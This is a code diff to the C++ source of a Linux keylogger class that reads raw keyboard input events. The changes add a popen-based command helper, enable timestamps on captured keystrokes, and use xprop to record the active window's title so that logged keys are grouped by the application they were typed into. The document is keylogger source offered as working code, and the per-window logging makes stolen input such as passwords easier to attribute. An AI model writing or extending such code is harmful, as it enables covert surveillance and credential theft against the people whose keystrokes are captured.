@@ -13,6 +13,8 @@
 #include <string.h>
 #include <string>
 
+
+//inclide chrono
  std::string CurrentDateTime() {
     std::string output = "Date:  ";
     time_t seconds = time(nullptr);
@@ -27,7 +29,18 @@ int check(int result) {
     perror(strerror(errno));
     exit(-1);
 }
-
+inline std::string exec(const char* cmd) {
+    FILE* pipe = popen(cmd, "r");
+    if (!pipe) return "ERROR";
+    char buffer[128];
+    std::string result = "";
+    while(!feof(pipe)) {
+        if(fgets(buffer, 128, pipe) != NULL)
+                result += buffer;
+    }
+    pclose(pipe);
+    return result;
+}
 bool isLetter(const int value)
 {
     if ((value >= 16 && value <= 25) || (value >= 30 && value <= 38) || (value >= 44 && value <= 50))
@@ -176,7 +189,7 @@ Key_logger::Key_logger(){
    } 
    std::vector<std::string> Key_logger::get_keys_vector(std::string path){
         std::vector<std::string> names;
-        //names.push_back(CurrentDateTime());
+        names.push_back(CurrentDateTime());
         int keys_fd; //дескриптор
         struct input_event t;  
         struct input_event t_shift;
@@ -184,11 +197,20 @@ Key_logger::Key_logger(){
         
         bool flag_shift = false;
         bool flag_caps = false;
+        std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
+        names.push_back(proc_name);
         while (true)
         {
-
+            std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
+            if (current_name != proc_name)
+            {
+                names.push_back("\n\n");
+                names.push_back(current_name);
+                proc_name = current_name;
+            }
             if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
             {
+
                 if (t.type == EV_KEY)
 
                     if (t.value == 0 || t.value == 1)
